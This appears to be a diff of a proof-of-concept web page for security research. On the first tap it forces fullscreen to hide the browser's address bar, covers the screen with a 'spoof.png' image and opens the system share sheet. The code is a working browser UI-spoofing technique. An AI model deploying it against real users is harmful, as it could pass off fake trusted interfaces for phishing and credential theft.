@@ -1,50 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fullscreen Attention Gap PoC</title>
+  <title>Security UI Spoof – UX Demo</title>
+  <meta charset="utf-8">
+  <meta name="viewport"
+        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
-<style>
-  body {
-    margin: 0;
-    font-family: sans-serif;
-    background: #111;
-    color: #fff;
-    height: 200vh;
-  }
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #111;
+      color: #fff;
+      font-family: sans-serif;
+      height: 200vh;
+    }
 
-  button {
-    margin: 40px;
-    padding: 16px 22px;
-    font-size: 18px;
-  }
+    #spoof {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      display: none;
+      z-index: 9999;
+      pointer-events: none;
+    }
 
-  #overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: url("spoof.png") no-repeat top center;
-    background-size: cover;
-    z-index: 9999;
-    display: none;
-    pointer-events: none;
-  }
-</style>
+    #content {
+      padding-top: 120px;
+      text-align: center;
+    }
+  </style>
 </head>
 
 <body>
 
-<button id="btn">Tap</button>
-<div id="overlay"></div>
+<img id="spoof" src="spoof.png">
+
+<div id="content">
+  <h1>Tap anywhere to trigger UI spoof demo</h1>
+</div>
 
 <script>
-const btn = document.getElementById('btn');
-const overlay = document.getElementById('overlay');
+document.addEventListener('click', async () => {
 
-btn.onclick = async () => {
   /* 1️⃣ Enter fullscreen → omnibar hides */
   if (document.documentElement.requestFullscreen) {
     try {
@@ -52,18 +53,20 @@ btn.onclick = async () => {
     } catch (e) {}
   }
 
-  /* 2️⃣ Show visual overlay */
-  overlay.style.display = 'block';
+  /* 2️⃣ Show spoof image */
+  document.getElementById("spoof").style.display = "block";
+  document.getElementById("content").style.display = "none";
 
-  /* 3️⃣ Optional: Web Share while fullscreen */
+  /* 3️⃣ Trusted system UI (safer than Contacts API) */
   if (navigator.share) {
     navigator.share({
       title: 'UX Research Demo',
-      text: 'Fullscreen + system UI attention gap',
+      text: 'Trusted system UI takes focus',
       url: location.href
     }).catch(()=>{});
   }
-};
+
+}, { once: true }); // only first tap
 </script>
 
 </body>
